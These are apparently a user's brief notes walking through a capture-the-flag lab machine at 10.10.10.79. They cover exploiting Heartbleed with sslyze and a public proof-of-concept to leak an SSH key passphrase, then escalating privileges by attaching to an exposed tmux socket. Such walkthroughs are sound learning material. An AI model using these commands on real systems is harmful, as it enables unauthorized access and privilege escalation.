Look at the autorecon results. mitm vulns are all rabbit holes.
I alsom tried to do RCE on decode/encode.php But also rabbit holes as they did the sanatization quite well.

### Foothold
```
# Google "xkcd heartbleed"

sslyze --heartbleed 10.10.10.79:443 # It is vulnerable

# Find the good exploit https://github.com/sensepost/heartbleed-poc
python heartbleed-poc.py -n100 -f dump.bin 10.10.10.79 # Get the passphrase

chmod 600 private.key
ssh hype@10.10.10.79 -i private.key # Use the passphrase
```

### Priv
```
history

# Google "exploit tmux" or the "exploit dev_sass" file

tmux -S dev_sass
```